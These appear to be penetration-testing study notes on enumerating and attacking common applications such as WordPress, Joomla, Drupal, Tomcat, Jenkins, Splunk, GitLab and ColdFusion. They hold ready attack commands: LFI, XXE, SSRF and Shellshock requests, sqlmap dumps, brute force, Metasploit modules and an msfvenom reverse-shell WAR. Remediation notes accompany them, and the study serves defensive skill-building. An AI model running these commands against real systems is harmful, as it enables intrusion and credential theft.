# Attacking Common Applications

> Status: ✅ Complete (reference)
> Date started: 2026-10-26
> Date finished: 2026-10-27
## 1. Goal
Enumerate and attack common off-the-shelf applications (CMSs, dev tools, etc.). Starting with WordPress.

## WordPress — discovery & enumeration (reference)
Target placeholder: `<URL>` (module example used `blog.inlanefreight.local`).

### Identify WordPress
```bash
curl -s <URL>/robots.txt                      # disallowed paths often reveal wp-admin/wp-content
curl -s <URL>/wp-admin/                        # redirect behaviour
curl -s <URL>/wp-content/plugins/              # plugin dir
curl -s <URL>/wp-content/themes/               # theme dir
```

### Version & theme
```bash
curl -s <URL> | grep -i "wordpress"            # meta generator / version hints
curl -s <URL>/wp-content/themes/<theme>/style.css
curl -s <URL>/wp-content/themes/<theme>/readme.txt
```

### Plugins (look for known-vuln versions)
```bash
curl -s <URL> | grep -i "plugins"
curl -s <URL>/wp-content/plugins/<plugin>/readme.txt   # version info
```

### User enumeration (manual)
Compare login responses for valid vs invalid users:
```bash
curl -s -I <URL>/wp-login.php -d "log=admin&pwd=invalid"
curl -s -I <URL>/wp-login.php -d "log=invalid&pwd=invalid"
```

### WPScan (automated)
```bash
sudo gem install wpscan
sudo wpscan --url <URL> --enumerate --api-token <TOKEN>
sudo wpscan --url <URL> --enumerate u,p,t      # users, plugins, themes
sudo wpscan --url <URL> --proxy 127.0.0.1:8080 # route through Burp
# brute force — in-scope + approved only:
sudo wpscan --url <URL> --passwords /usr/share/wordlists/rockyou.txt --usernames admin,john
```

### XML-RPC
```bash
curl -i <URL>/xmlrpc.php
curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' <URL>/xmlrpc.php
```
`system.multicall` can amplify brute-force; disabling/limiting xmlrpc.php is the fix.

### Extra checks
```bash
curl -s <URL>/robots.txt | grep Disallow
curl -s <URL>/wp-config.php                     # should NOT be readable
curl -s <URL> | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*"   # endpoints/keys in source
curl -s <URL>/wp-content/uploads/               # open directory listing?
```

> Brute-force and credential attacks are intrusive — scope + approval only. `wp-config.php` being readable = critical finding (DB creds).

## WordPress — attacking (reference)
Target placeholder `<URL>`, attacker IP `<LHOST>`. All of this is intrusive — authenticated/exploitation actions need scope + approval.

### Authenticated code exec via theme editor
With admin access, an editable theme PHP file (e.g. `404.php`) can be made to run commands — classic admin-to-RCE path. Fix: disable the file editor (`DISALLOW_FILE_EDIT`).
```bash
curl "<URL>/wp-content/themes/<theme>/404.php?0=id"   # after injecting a cmd param into the file
```

### Metasploit admin shell upload (needs valid admin creds)
```text
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <IP>        # set VHOST <URL> if vhost-based
set USERNAME <user>    # set PASSWORD <pass>
set LHOST <LHOST>
run
```

### Known plugin vulns (version-dependent)
```bash
# mail-masta LFI
curl -s "<URL>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
# wpDiscuz unauthenticated RCE (CVE-2020-24186) — public PoC uploads a shell, then:
curl -s "<URL>/wp-content/uploads/<year>/<month>/<uploaded>.php?cmd=id"
```
Always map plugin + version from enum, then check Exploit-DB / searchsploit for a matching PoC.

### User enumeration via REST API
```bash
curl -s <URL>/wp-json/wp/v2/users      # often leaks usernames even when login is hardened
```

### XML-RPC brute force
`system.multicall` lets many credential guesses ride in one request, amplifying brute force. Public scripts automate it against `xmlrpc.php`. Fix: disable or restrict xmlrpc.php.

### wp-config.php exposure
```bash
curl -s <URL>/wp-config.php            # readable = DB creds exposed = critical
```

### Web shell obfuscation (concept, for recognition & reporting)
Attackers rarely drop a plaintext shell. A common pattern wraps the payload in `base64_decode()` fed to `eval()`, so the file looks like a harmless blob but decodes at runtime to a command-executing one-liner. Why it matters for me:
- **Detecting it:** grep uploaded/content dirs for `eval(`, `base64_decode(`, `assert(`, `system(`, `gzinflate(` in `.php` files; flag recently modified files in `wp-content/uploads/`.
- **Reporting it:** note the obfuscation as an IOC and recommend file-integrity monitoring + blocking PHP execution in upload dirs.
I don't store working shell payloads in this repo.

## Joomla — discovery, enum & attacking (reference)
Target placeholder `<URL>`.

### Identify Joomla
```bash
curl -s <URL>/ | grep -i joomla
curl -s <URL>/robots.txt
curl -s <URL>/README.txt                                       # version
curl -s <URL>/administrator/manifests/files/joomla.xml         # detailed version
curl -s <URL>/plugins/system/cache/cache.xml                   # approx version
curl -I <URL>/favicon.ico                                      # default favicon
```
Fingerprint from several sources (README + joomla.xml + cache.xml) for an accurate version — it drives which exploits apply.

### Version via headers / changelog
```bash
curl -I <URL>/ | grep "X-Content-Encoded-By"
curl -s <URL>/CHANGELOG.php
```

### Automated scanners
```bash
droopescan scan joomla --url <URL>/
python2.7 joomlascan.py -u <URL>/
```

### Login brute force (scope + approval only)
```bash
python3 joomla-brute.py -u <URL> -w <wordlist> -usr admin
```

### Extension enumeration (common vuln source)
```bash
curl -s <URL>/components/
curl -s <URL>/modules/
curl -s <URL>/plugins/
curl -s <URL>/templates/
curl -s <URL>/media/
```

### Config / backup exposure
```bash
curl -s <URL>/configuration.php        # sensitive: DB creds; also .bak
curl -s <URL>/configuration.php.bak
curl -s <URL>/backup.zip
curl -s <URL>/joomla.sql
```

### REST API / user enum
```bash
curl -s <URL>/api/index.php/v1/users
curl -X POST -d "username=admin" "<URL>/index.php?option=com_users&view=reset"
```

### Directory / file discovery
```bash
dirb <URL> /usr/share/wordlists/dirb/common.txt
```

### Known CVEs
```bash
# SQLi CVE-2017-8917
sqlmap -u "<URL>/index.php?option=com_content&id=1" --dbs --batch
# CVE-2023-23752 — unauth info disclosure (leaks config incl. DB creds)
curl -X GET "<URL>/api/index.php/v1/config/application?public=true"
```

### Log checks
```bash
curl -s <URL>/logs/error.php
curl -s <URL>/logs/debug.log
```

> `configuration.php` exposure and CVE-2023-23752 both leak DB credentials — critical findings. Brute-force and SQLi are intrusive: scope + approval only.

## Joomla — attacking (reference)
Intrusive — scope + approval. Target `<URL>`, attacker `<LHOST>`.

### Authenticated template RCE
Log in to `/administrator`, edit a template PHP file (e.g. `error.php`) to run commands via a non-standard param, then clean up.
```bash
curl -s "<URL>/templates/<template>/error.php?<rand>=id"
```
Fix: lock down template editing, restrict admin panel access.

### CVE-2019-10945 — core directory traversal + file deletion
```bash
python2.7 joomla_dir_trav.py --url "<URL>/administrator/" --username admin --password admin --dir /
```
Can read/list sensitive files like `configuration.php`.

### Config exposure
```bash
curl -s <URL>/configuration.php        # DB creds if readable
```

### Extension exploitation
Enumerate extensions → research the specific version → craft the exploit against the component path. Extensions are the most common Joomla attack vector.

### Metasploit
```text
search joomla
use exploit/unix/webapp/joomla_<module>
set RHOSTS <IP> ; set TARGETURI /administrator/
set USERNAME admin ; set PASSWORD <pass>
set LHOST <LHOST> ; run
```

### SQLi → DB dump (sqlmap workflow)
```bash
sqlmap -u "<URL>/index.php?id=1" --dbs --batch
sqlmap -u "<URL>/index.php?id=1" -D <db> --tables --batch
sqlmap -u "<URL>/index.php?id=1" -D <db> -T <table> --columns --batch
sqlmap -u "<URL>/index.php?id=1" -D <db> -T <table> -C <cols> --dump --batch
```

### REST API / XSS / CLI
```bash
curl -s <URL>/api/index.php/v1/users                      # enum/modify if enabled
curl "<URL>/index.php?param=<script>alert(1)</script>"    # reflected XSS test
joomla user:list                                          # if shell access
```

### Post-exploitation
Generic, not Joomla-specific — see the dedicated modules:
- Privesc enum: `linpeas.sh` (Linux, module 25) / `winpeas.exe` (Windows, module 26)
- Pivoting (chisel, sshuttle): module 12 → `cheatsheets/pivoting.md`

### Web shells
Obfuscated shell generation/detection is covered once in the WordPress section above (I don't store working payloads). Same technique applies here.

## Drupal — discovery & enumeration (reference)
Target `<URL>`. Drupal structure: `/modules/`, `/themes/`, `/sites/`, node-based URLs (`/node/1`).

### Identify & version
```bash
curl -s <URL> | grep -i drupal                         # HTML metadata
curl -s <URL>/robots.txt                               # disallows + node refs
curl -s <URL>/CHANGELOG.txt                            # version (often blocked)
curl -s <URL>/rss.xml | grep generator                # generator metadata
curl -s <URL>/core/assets/vendor/jquery/jquery.min.js | grep -i drupal
droopescan scan drupal -u <URL>                        # automated version + modules/themes
# if DB access gained:  SELECT version FROM system;
```

### Modules & themes (find exact versions in .info.yml)
```bash
curl -s <URL>/modules/
curl -s <URL>/modules/<module>/<file>.info.yml
curl -s <URL>/themes/
curl -s <URL>/themes/<theme>/<file>.info.yml
```

### Config / backups / debug exposure
```bash
curl -s <URL>/sites/default/settings.php               # DB creds if readable
curl -s <URL>/sites/default/files/backup.sql           # exposed DB backup
curl -s <URL>/phpinfo.php                               # debug left enabled
```

### Users / content / APIs
```bash
curl -s <URL>/?q=user                                  # public profiles
curl -s <URL>/user/1                                   # default admin enum
curl -s <URL>/rest/user/login_status?_format=json      # REST API if enabled
curl -s <URL>/node/2                                   # sequential node IDs
curl -s <URL>/node.json                                # JSON API enabled?
curl -X POST <URL>/graphql -H "Content-Type: application/json" --data '{"query":"{__schema{types{name}}}"}'   # GraphQL schema
```

### Admin panel
```bash
curl -s <URL>/user/login
curl -s <URL>/admin
```

> `settings.php` and exposed `backup.sql` leak DB creds — critical. Known Drupal RCEs (e.g. Drupalgeddon2 CVE-2018-7600) depend on exact core version, so fingerprint first.

## Drupal — attacking (reference)
Intrusive — scope + approval. Fingerprint the exact core version first; Drupalgeddon variants are version-specific.

### PHP filter module (Drupal < 8)
With admin, enable the core PHP filter module and inject PHP into content for RCE. Needs client comms before enabling modules. Fix: PHP filter removed in Drupal 8+.

### Backdoored module upload
With admin, a malicious module (e.g. a trojanized `captcha` package) can be uploaded for RCE. I don't store the shell payload — see the web-shell detection note in the WordPress section. Note: never modify production without explicit permission.

### Drupalgeddon family (the big ones)
```text
# Drupalgeddon  CVE-2014-3704  — SQLi, creates an admin user (Drupal 7 core)
python2.7 drupalgeddon.py -t <URL> -u <user> -p <pass>

# Drupalgeddon2 CVE-2018-7600  — unauth RCE via user registration form
python3 drupalgeddon2.py         # public PoC; drops a shell (payload not stored here)

# Drupalgeddon3 CVE-2018-7602  — authenticated RCE via Form API (needs a valid session)
msf6> use exploit/multi/http/drupal_drupageddon3
msf6> set RHOSTS <IP>; set VHOST <URL>; set DRUPAL_SESSION <sess>; set DRUPAL_NODE 1; set LHOST <LHOST>; run
```

### Config exposure
```bash
curl -s <URL>/sites/default/settings.php     # DB creds if readable
```

### SQL injection → dump (sqlmap)
```bash
sqlmap -u "<URL>/node/1?id=1" --dbs --batch
sqlmap -u "<URL>/node/1?id=1" -D <db> --tables --batch
sqlmap -u "<URL>/node/1?id=1" -D <db> -T <table> -C <cols> --dump --batch
sqlmap -u "<URL>/node/1?id=1" --level 5 --risk 3        # deeper, noisier
```

### Other web attack surface (primary homes in web modules 17/21/23)
```bash
# File upload (module 21) — test extensions, check MIME enforcement
curl -F "file=@test.php" <URL>/<upload_path>
# XXE (module 23) — read local files
curl -X POST -H "Content-Type: application/xml"   -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' <URL>/<xml_endpoint>
# SSRF (module 23) — hit cloud metadata
curl "<URL>/page?url=http://169.254.169.254/latest/meta-data/"
# Access control — admin reachable unauthenticated?
curl -I <URL>/admin
```

### Brute force (scope + approval only)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <HOST>   http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:Invalid username or password"
```

> XXE/SSRF/file-upload are general web attacks — primary notes build in modules 21 (upload) and 23 (web attacks); kept here as the Drupal-context quick reference.

## Apache Tomcat — discovery, enum & attacking (reference)
Target `<HOST>:<PORT>`.

### Version detection
```bash
curl -I http://<HOST>:<PORT>/ | grep -i Server       # server header
curl -s http://<HOST>:<PORT>/docs/ | grep -i "Apache Tomcat"
curl -s http://<HOST>:<PORT>/nonexistentpage          # error pages may leak version
```

### Key files / directory structure
- `/conf/tomcat-users.xml` — **user creds + roles (plaintext)**
- `/conf/web.xml`, `/webapps/<app>/WEB-INF/web.xml` — routes/servlets
- `/conf/server.xml`, `context.xml`, `catalina.properties` — ports, config, creds
- `/webapps/` — deployed apps · `/bin` — scripts

### Manager app enumeration
```bash
gobuster dir -u http://<HOST>:<PORT>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# look for /manager and /host-manager
```
Default creds to try: `tomcat:tomcat`, `admin:admin`, `tomcat:password`, `role1:role1`.
```bash
hydra -l tomcat -P /usr/share/wordlists/rockyou.txt <HOST> http-get /manager/html   # scope+approval
```

### WAR upload RCE (after /manager access)
The classic Tomcat RCE: deploy a malicious WAR via the Manager. Standard payload generation:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war
# deploy via Manager, then trigger the JSP endpoint
```
Fix: remove/restrict Manager, strong creds, don't expose it externally.

### JMX (often 1099)
```bash
java -jar jmxterm.jar --url service:jmx:rmi:///jndi/rmi://<HOST>:<PORT>/jmxrmi   # explore MBeans
# metasploit: use exploit/multi/misc/java_jmx_server ; set RHOST/RPORT ; run
```

### AJP connector (8009) — Ghostcat CVE-2020-1938
```bash
nmap -p8009 --script ajp-headers <HOST>
python3 ghostcat.py -u <HOST>:8009        # file disclosure / potential RCE
```

### Web app enum & CVEs
```bash
gobuster dir -u http://<HOST>:<PORT>/ -w <wordlist>           # find apps/JSPs
wfuzz -c -z file,<ext_list> --hc 404 http://<HOST>:<PORT>/FUZZ.jsp
searchsploit tomcat <version>
```

> `tomcat-users.xml` with plaintext creds and an exposed `/manager` = the standard Tomcat compromise path. WAR-upload and JMX are intrusive; Ghostcat needs AJP exposed.

### Tomcat — attacking: CVEs & modules (reference)
All intrusive, scope + approval. Fingerprint version first.

**Manager brute force**
```text
msf6> use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <IP>; set RPORT <PORT>; set STOP_ON_SUCCESS true
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
run
```

**WAR upload RCE (after /manager login)** — generate WAR with msfvenom (see Tomcat section above), deploy via Manager, trigger the endpoint. Don't fetch prebuilt webshells into the repo.
```text
msf6> use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <IP>; set USERNAME <u>; set PASSWORD <p>; run
```

**Version-specific CVEs**
| CVE | What it is | Exploited with |
|---|---|---|
| CVE-2020-1938 (Ghostcat) | AJP file read / potential RCE | `nmap -p8009 --script ajp-headers`, public ghostcat PoC (`-f WEB-INF/web.xml`) |
| CVE-2009-3548 | Manager deploy bypass (default creds / unauth) | `curl -T shell.war "http://<IP>:8080/manager/deploy?path=/x"` |
| CVE-2017-12617 | Arbitrary JSP upload via HTTP PUT (when PUT enabled) | PUT a JSP to the webroot — payload not stored here; see web-shell detection note |
| CVE-2020-9484 | Java deserialization RCE via persistent sessions | `ysoserial` gadget (e.g. CommonsCollections) POSTed as a serialized object — gadget/command not stored here |
| CVE-2016-8735 | JMX RMI RCE | `use exploit/multi/misc/java_jmx_server` (RPORT 1099) |

**Connectors:** AJP can expose internal resources; HTTP connector misconfigs can allow auth bypass.

> The default-creds → `/manager` → WAR-upload path is still the most common real-world Tomcat compromise. The CVEs matter when creds fail or Manager isn't reachable.

### Jenkins — discovery, enum & attacking (reference)
Default ports: **8080** (web UI), **50000** (agent/slave comms, often overlooked). Intrusive actions: scope + approval.

**Detection**
```bash
curl -I http://<HOST>:8080/            # X-Jenkins header shows version
nmap -sV -p8080,50000 <HOST>
```

**Enumeration**
```bash
# via web
curl http://<HOST>:8080/pluginManager/        # installed plugins (common vuln source)
curl http://<HOST>:8080/configureSecurity/     # auth realm (Jenkins DB / LDAP) + access control
curl http://<HOST>:8080/api/json               # API — may leak job/user data
# via CLI
java -jar jenkins-cli.jar -s http://<HOST>:8080/ list-jobs
java -jar jenkins-cli.jar -s http://<HOST>:8080/ list-plugins
```

**Weak/default creds**
Try `admin:admin`, `admin:password`.
```text
msf6> use auxiliary/scanner/http/jenkins_login ; set RHOSTS <IP> ; run
```

**Script Console RCE (the main Jenkins finding)**
With access to `/script` (Groovy console) or `groovysh` via CLI, Jenkins runs arbitrary Groovy = RCE as the Jenkins user. This is why Script Console access is critical. Fix: lock down `/script`, enforce auth + matrix authorization.

**Deserialization** — older Jenkins/CLI are vulnerable to Java deserialization; `ysoserial` (CommonsCollections gadgets) generates payloads for vulnerable endpoints. Version-specific.

**Post-exploitation**
```bash
cat /var/lib/jenkins/credentials.xml      # stored creds (often encrypted — pull the master key too)
```
Persistence via planted job/JSP under `/var/lib/jenkins/jobs/` — I don't store backdoor payloads; see the web-shell detection note. Note persistence + access-control changes in the report for cleanup.

> Jenkins = fast RCE: default creds → Script Console → shell as the build user, then loot `credentials.xml` for pivoting into whatever the CI connects to (often the juiciest part).

### Jenkins — attacking (expanded)

**Script Console RCE via `scriptText`** (the primary path). With creds, POST Groovy to run commands as the Jenkins user:
```bash
# prove RCE (benign)
curl -X POST -u <u>:<p> --data-urlencode "script=println 'id'.execute().text" http://<HOST>:8080/scriptText
# Windows equivalent
curl -X POST -u <u>:<p> --data-urlencode "script=println 'cmd /c whoami'.execute().text" http://<HOST>:8080/scriptText
```
A full interactive/reverse shell is trivial from here — I don't store the payload; go via a listener/`msfvenom` and note it in the report. Fix: restrict `/script`, enforce RBAC.

**Plugin CVEs** — enumerate plugins, map versions to CVEs. Example: *Pipeline: Groovy* CVE-2019-10352 (arbitrary code/file read). Vulnerable plugins are a top Jenkins vector.

**Credential extraction**
```bash
curl -u <u>:<p> http://<HOST>:8080/credentials/store/system/domain/_/
cat /var/lib/jenkins/credentials.xml      # with shell access; decrypt with master.key + hudson.util.Secret
```

**Jobs / pipelines** — create or modify a job/pipeline to run commands (`create-job`, `build` via jenkins-cli). Build steps run on agents, so this is also a privesc/lateral path.

**SSRF via Groovy** — the script console can open connections to internal services (`url.toURL().openConnection()`), reaching things the attacker can't hit directly. Useful for internal recon / cloud metadata.

**Agents/slaves (port 50000)** — misconfigured or high-privilege agents let you reach the master or run as a higher-privileged user. Check agent auth and comms.

**Persistence** — Script Console can create accounts or weaken the security realm for future access. I note the technique rather than store the payload; always document persistence changes for cleanup.

**CSRF / auth bypass** — Jenkins has CSRF crumbs, but misconfigs allow bypass (Referer/token manipulation); also check anonymous access and default creds.

**Hardening (for the remediation section of my report)**
- Update Jenkins + all plugins regularly
- Restrict the script console; enforce strong auth + RBAC (matrix authorization)
- MFA, strong passwords, network segmentation, least privilege for agents
- Regular security audits

> Takeaway: enumerate plugins → check default/anon access → Script Console = RCE → loot `credentials.xml` → pivot via stored creds. Agents extend the blast radius.

### Splunk — discovery, enum & attacking (reference)
Ports: **8000** (web UI), **8089** (REST API / splunkd). Often runs as **root/SYSTEM** — compromise = high privilege + access to all ingested logs (frequently full of creds).

**Discovery / enum**
```bash
sudo nmap -sV -p8000,8089 <HOST>          # Splunkd httpd
# web UI: http://<HOST>:8000  — no login prompt may mean Splunk Free (no auth)
curl -k -u admin:changeme https://<HOST>:8089/services/server/info    # default creds on old versions
```
- Default/weak creds: `admin:changeme` (older), plus the usual weak ones.
- REST API (8089) is a strong enum surface; log search API can pull indexed data (often credentials/network info).
- Brute force (scope+approval): `hydra ... http-form-post "/en-US/account/login:username=^USER^&password=^PASS^:Invalid"`.

**RCE via scripted inputs (the Splunk attack)**
Splunk apps can define *scripted inputs* that execute a script (bash/PowerShell/Python) on a schedule. An attacker who can install an app — admin rights, or an unauthenticated **Splunk Free** / exposed deployment server — gets code execution as the Splunk user. Deploy via **Apps → Install app from file**, or drop into `$SPLUNK_HOME/etc/deployment-apps/` on a deployment server and restart.
- I don't store the malicious-app payloads (rev shells / inputs.conf) in this repo.
- Also abusable: **forwarders** (push a malicious input to many hosts = lateral movement), hijacked **session cookies** (`splunkd_8000`) replayed via curl, and **SSRF** through splunkd data inputs (e.g. reaching `169.254.169.254` cloud metadata).
- **Remediation:** don't run Splunk as root; restrict app install + deployment-server access; change default creds; network-segment 8089; monitor `deployment-apps`.

### PRTG Network Monitor — CVE-2018-9276 (reference)
Authenticated OS command injection in PRTG (vulnerable **< 18.2.39**). PRTG service runs as SYSTEM, so injection = SYSTEM.

**Discovery**
```bash
sudo nmap -sV -p- --open -T4 <HOST>        # port 8080: "Indy httpd ... Paessler PRTG"
curl -s http://<HOST>:8080/index.htm -A "Mozilla/5.0" | grep -i version
# EyeWitness often surfaces default creds: prtgadmin:prtgadmin
```

**The vuln (CVE-2018-9276)**
After login (default/weak creds), **Setup → Account Settings → Notifications → Add notification → Execute Program**. The *Parameter* field passed to the demo PS1 notification isn't sanitized, so OS commands chained with `;` run as SYSTEM. Trigger with the notification's **Test** button.
- Typical impact: add a local admin, or a reverse shell. I note the injection point, not the payload.
- **Verify** the new access: `crackmapexec smb <HOST> -u <user> -p <pass>`, then `evil-winrm` / `psexec.py` / `wmiexec.py`.
- **Remediation:** patch to ≥ 18.2.39, change default creds, restrict who can edit notifications.

> Pattern across monitoring tools (Splunk, PRTG, Nagios…): they run with high privilege and have a legitimate "run a script/command" feature. Get in with default creds → abuse that feature → SYSTEM/root. Default creds + patch level are the whole game.

### osTicket — enumeration (reference)
Support-desk app. Value is the **information** it leaks, not usually a direct RCE.

**Identify:** `OSTSESSID` cookie, "powered by osTicket" in the footer; EyeWitness to spot it across a subdomain sweep.

**Technique**
- OSINT creds (e.g. Dehashed) → test against the portal and other services (credential reuse).
- **Create a ticket to harvest an internal email** (e.g. `940288@inlanefreight.local`), then use that address to register for other company services (Slack, GitLab, etc.) — a foothold-chaining trick.
- Read tickets for password resets, internal configs, usernames/emails.
- Known CVEs by version (Exploit-DB): e.g. **CVE-2020-24881** SSRF in osTicket 1.14.1 (internal port scan / reach internal resources).
- Social engineering support staff for process/system details.

**Remediation:** minimize externally exposed apps, MFA on portals, strong password policy, staff phishing/SE awareness.

### GitLab — discovery, enum & attacking (reference)
**Discovery:** the GitLab login page gives it away. Version is on `/help` (needs auth).

**Enumeration**
- `/explore` — **public projects** often contain API scripts, config secrets, SSH private keys, source to review.
- `/users/sign_up` — if registration is open, register to reach **internal** projects; also a **user/email enum** oracle ("Email/Username has already been taken").
- Logged in: re-check `/explore`, use **search** for `password`/`api_key`/tokens, browse **groups** and **snippets**.
- Test OSINT creds (credential reuse).

**Attacking**
```bash
# username enumeration (automated)
python3 gitlab_userenum.py -u http://<HOST>:8081/ -l users.txt
```
- **Password spraying** after enum — mind the lockout policy (default 10 fails → 10-min lock); go slow/distributed.
- **ExifTool RCE — CVE-2021-22205** (GitLab CE ≤ 13.10.2; unauthenticated on < 13.10.3 in many setups). Malicious image metadata is processed by ExifTool → RCE. Public exploit:
```bash
python3 gitlab_13_10_2_rce.py -t http://<HOST>:8081 -u <user> -p <pass> -c '<command>'
# reverse-shell payload goes in -c; not stored here — use a listener/msfvenom and note it in the report
```

**Security notes / remediation:** 2FA is **off by default** (risk) — enforce it; Fail2Ban for brute force; IP-restrict external access; limit registration to company domains + admin approval; patch to a fixed version for CVE-2021-22205.

> GitLab pattern: scrape public/internal repos for secrets (SSH keys, tokens, hardcoded creds) → that often gives access elsewhere before you even need the RCE. Repos are a loot goldmine.

### Tomcat CGI RCE — CVE-2019-0232 (reference)
Command injection in the Tomcat **CGI Servlet** when `enableCmdLineArguments=true`. Affected: Tomcat 9.0.0.M1–9.0.17, 8.5.0–8.5.39, 7.0.0–7.0.93. Windows-specific (batch CGI).

**Enum**
```bash
nmap -p- -sC -Pn <HOST> --open
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://<HOST>:8080/cgi/FUZZ.bat    # find e.g. welcome.bat
```

**Exploit (query string after `?&`)** — benign PoCs prove it:
```text
http://<HOST>:8080/cgi/welcome.bat?&dir                               # list files
http://<HOST>:8080/cgi/welcome.bat?&set                               # env vars (PATH often unset)
http://<HOST>:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe    # full path if PATH unset
# URL-encode to bypass char filtering:
http://<HOST>:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
- `&` separates commands; if PATH is unset, call binaries by full path; URL-encoding bypasses filtered chars.
- **Fix:** patch Tomcat, set `enableCmdLineArguments=false`.

### Shellshock — CVE-2014-6271 (reference)
Bash ≤ 4.3 mishandles function definitions in environment variables → arbitrary command execution, classically through **CGI scripts** (the web server passes headers into env vars that Bash evaluates).

**Enum**
```bash
gobuster dir -u http://<HOST>/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi,sh
curl -i http://<HOST>/cgi-bin/<script>.cgi      # confirm an active CGI script
```

**Confirm the vuln** — the injection vector is the magic bytes `() { :; };` in a header (commonly `User-Agent`); if what follows runs, it's vulnerable:
```bash
curl -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' http://<HOST>/cgi-bin/<script>.cgi
```
Reading `/etc/passwd` is the standard confirmation. From here RCE/reverse-shell is trivial via the same header — I don't store the shell payload; use a listener and note it in the report.

- **Other vectors:** any header reflected into env (`Cookie`, `Referer`), DHCP, some SSH forced-commands.
- **Fix:** patch Bash, firewall/remove CGI, decommission EOL hosts.

> CGI is legacy but still shows up. Both of these are "old box" wins — always fuzz `/cgi-bin/` and `/cgi/` and check the Bash/Tomcat version.

### Thick Client Applications (reference)
Locally installed apps (.NET, Java, C++) that do client-side processing. **Two-tier** = client talks straight to DB; **three-tier** = client → app server → DB. Common flaws: hardcoded creds, DLL hijacking, insecure local storage, unencrypted comms, path traversal, SQLi.

**Analysis by surface:**
| Surface | What to do | Tools |
|---|---|---|
| Info gathering | Identify language/framework, PE headers, deps | CFF Explorer, Detect It Easy, PE Explorer, Process Monitor, `strings` |
| Client-side | Decompile/disassemble, deobfuscate | Ghidra, IDA, dnSpy, x64dbg, Radare2, JADX, Frida, de4dot (.NET) |
| Network-side | Capture/inspect/MITM traffic | Wireshark, tcpdump, Burp, mitmproxy, TCPView |
| Server-side | OWASP Top 10 against the backend; DLL hijacking | (web tooling) |

**Hardcoded credential extraction (example workflow)**
A binary from an exposed share (e.g. `Restart-OracleService.exe` in NETLOGON):
```text
1. Run it while Process Monitor watches  → it drops a temp batch + monta.ps1 + a .txt
2. Lock the Temp folder perms so dropped files aren't deleted, then grab them
3. The PS script decodes the .txt into a .NET exe
4. Dump memory of that exe (x64dbg), run strings on the dump, de4dot + dnSpy to read the .NET source → hardcoded creds
```
```bash
strings64.exe <dump>.bin          # pull strings from memory dump
de4dot <dump>.bin                 # clean/deobfuscate .NET
Get-EventLog -LogName Application -Newest 50   # app logs for debugging
```

**Web vulns in 3-tier thick clients**
```bash
# capture + filter traffic
sudo tcpdump -i eth0 -w capture.pcap
tshark -r capture.pcap -T fields -e http.request.uri
# extract + decompile Java client
jar -xvf fatty-client.jar
jd-gui fatty-client.jar          # (or JADX / dnSpy for .NET)
# redirect client to my server for testing
echo "<MY_IP> server.local" | sudo tee -a /etc/hosts
```
- **Path traversal** test payloads: `../../../etc/passwd`, `..\..\..\windows\system32\drivers\etc\hosts`
- **SQLi** test payloads: `' OR '1'='1' -- ` (auth bypass), `' UNION SELECT username,password FROM users -- ` (destructive payloads like DROP are never used on real targets)

**Remediation:** input validation, strong auth, TLS for all comms, no hardcoded secrets, obfuscation, patching.

> Thick clients hide secrets in the binary and on the wire. The two highest-value moves: run Process Monitor while the app works to catch dropped files, and intercept its traffic — creds are usually in one or the other.

### ColdFusion (reference)
Java-based CFML platform. Extensions `.cfm`/`.cfc`. Ports: 80/443/8500/5500/1935/25.

**Enum**
```bash
nmap -p- -sC -Pn <HOST> --open
curl -I http://<HOST>              # Server/X-Powered-By: ColdFusion
# strong tell: /CFIDE/administrator , admin.cfm , cfdocs
gobuster dir -u http://<HOST>:8500 -w <wordlist>
```

**Known CVEs**
```bash
searchsploit adobe coldfusion
# CVE-2010-2861 directory traversal (read arbitrary files via locale param)
python2 14641.py <HOST> 8500 "../../../../../../ColdFusion8/lib/password.properties"
# CVE-2009-2265 unauth RCE via FCKeditor file upload (exploit 50057.py — edit IP/port)
```
> password.properties holds the admin hash — classic ColdFusion loot.

### IIS Tilde (8.3 short name) Enumeration (reference)
IIS exposes legacy 8.3 short names via the `~` char (`SecretDocuments` → `SECRET~1`). Affected IIS 5.0–8.5. A `200`/`404` difference leaks valid short names, then brute the full name.
```bash
nmap -p- -sV -sC --open <HOST>
java -jar iis_shortname_scanner.jar 0 5 http://<HOST>/     # automate
# build a wordlist filtered to the discovered prefix, then:
gobuster dir -u http://<HOST>/ -w /tmp/list.txt -x .aspx,.asp
```
**Fix:** `fsutil behavior set disable8dot3 1`, URL-rewrite rules to block `~`.

### Apps Connecting to Services — pulling creds from binaries (reference)
Apps that connect to a DB usually carry a **connection string** with creds.
- **ELF (Linux):** debug in GDB/PEDA, disassemble `main`, breakpoint the `SQLDriverConnect` call, read the connection string from registers (RDX).
```bash
gdb ./octopus_checker
set disassembly-flavor intel
disas main
b *0x<addr>
run          # inspect RDX for the connection string
```
- **DLL (.NET, Windows):** `Get-FileMetaData .\MultimasterAPI.dll`, then decompile in **dnSpy** and read controller classes for connection strings.
- Then: test the creds for **reuse** / **password spraying** against other services.

### Other Notable Applications (methodology + quick vuln map)
Methodology beats memorizing tools: enumerate thoroughly (EyeWitness for visual triage), stay adaptable, **always check default creds and known CVEs**, abuse built-in "run a command/upload" features.

| App | Typical win |
|---|---|
| Axis2 | weak/default creds → RCE via malicious AAR upload |
| WebSphere | default `system:manager` → RCE via WAR deploy |
| Elasticsearch | old forgotten installs, past RCEs |
| Zabbix | SQLi, auth bypass, LDAP pw disclosure, API → RCE |
| Nagios | default `nagiosadmin:PASSW0RD`, multiple RCEs |
| WebLogic | many CVEs incl. unauth RCE |
| MediaWiki/SharePoint | known exploits, search → credential disclosure |
